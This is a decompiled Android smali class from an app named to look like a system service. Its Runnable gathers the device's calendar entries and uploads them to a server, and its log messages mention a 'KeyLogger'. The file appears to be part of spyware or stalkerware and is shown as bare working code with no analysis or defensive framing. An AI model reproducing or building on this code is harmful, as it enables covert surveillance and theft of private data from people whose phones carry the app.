.class Lcom/systemservice/common/features/calendarHistory/b;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/common/features/calendarHistory/c;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/common/features/calendarHistory/c;


# direct methods
.method constructor <init>(Lcom/systemservice/common/features/calendarHistory/c;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    const-string v0, "TAG"

    :try_start_0
    iget-object v1, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v1, v1, Lcom/systemservice/common/features/calendarHistory/c;->b:Ljava/lang/String;

    if-eqz v1, :cond_4

    iget-object v1, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v1, v1, Lcom/systemservice/common/features/calendarHistory/c;->b:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v1

    if-nez v1, :cond_4

    new-instance v1, Lcom/systemservice/common/features/calendarHistory/d;

    iget-object v2, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v2, v2, Lcom/systemservice/common/features/calendarHistory/c;->a:Landroid/content/Context;

    const/4 v3, 0x0

    invoke-direct {v1, v2, v3}, Lcom/systemservice/common/features/calendarHistory/d;-><init>(Landroid/content/Context;Z)V

    iget-object v2, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v2, v2, Lcom/systemservice/common/features/calendarHistory/c;->a:Landroid/content/Context;

    iget-object v3, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v3, v3, Lcom/systemservice/common/features/calendarHistory/c;->c:Ljava/util/List;

    invoke-virtual {v1, v2, v3}, Lcom/systemservice/common/features/calendarHistory/d;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const/4 v2, 0x1

    const-string v3, "Calendar_Log"

    if-ne v1, v2, :cond_0

    :try_start_1
    sget-object v2, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v4, "Calendar:  SEND Calendar of KeyLogger successful"

    invoke-virtual {v2, v4}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string v2, " SEND Calendar of KeyLogger successful"

    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v2, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v2, v2, Lcom/systemservice/common/features/calendarHistory/c;->d:Lcom/systemservice/a/h/e;

    iget-object v3, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v3, v3, Lcom/systemservice/common/features/calendarHistory/c;->c:Ljava/util/List;

    invoke-virtual {v2, v3}, Lcom/systemservice/a/h/e;->a(Ljava/util/List;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1

    :cond_0
    const/16 v2, -0x14

    const-string v4, " SEND Calendar PACKAGE ERROR"

    if-ne v1, v2, :cond_2

    :try_start_2
    const-string v2, "ZRespoHttp"

    const-string v5, "Calendar sent to server failed."

    invoke-static {v2, v5}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    sget-object v2, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v5, "Calendar:  Calendar sent to server failed."

    invoke-virtual {v2, v5}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v2, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v2, v2, Lcom/systemservice/common/features/calendarHistory/c;->a:Landroid/content/Context;

    invoke-static {v2}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_1

    iget-object v2, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v2, v2, Lcom/systemservice/common/features/calendarHistory/c;->d:Lcom/systemservice/a/h/e;

    iget-object v5, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v5, v5, Lcom/systemservice/common/features/calendarHistory/c;->c:Ljava/util/List;

    invoke-virtual {v2, v5}, Lcom/systemservice/a/h/e;->a(Ljava/util/List;)V

    :cond_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    :goto_0
    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    :cond_2
    iget-object v2, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v2, v2, Lcom/systemservice/common/features/calendarHistory/c;->a:Landroid/content/Context;

    invoke-static {v2}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_3

    iget-object v2, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v2, v2, Lcom/systemservice/common/features/calendarHistory/c;->d:Lcom/systemservice/a/h/e;

    iget-object v5, p0, Lcom/systemservice/common/features/calendarHistory/b;->a:Lcom/systemservice/common/features/calendarHistory/c;

    iget-object v5, v5, Lcom/systemservice/common/features/calendarHistory/c;->c:Ljava/util/List;

    invoke-virtual {v2, v5}, Lcom/systemservice/a/h/e;->a(Ljava/util/List;)V

    :cond_3
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_0

    :goto_1
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ret_code = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :catch_0
    move-exception v1

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_4
    :goto_2
    return-void
.end method
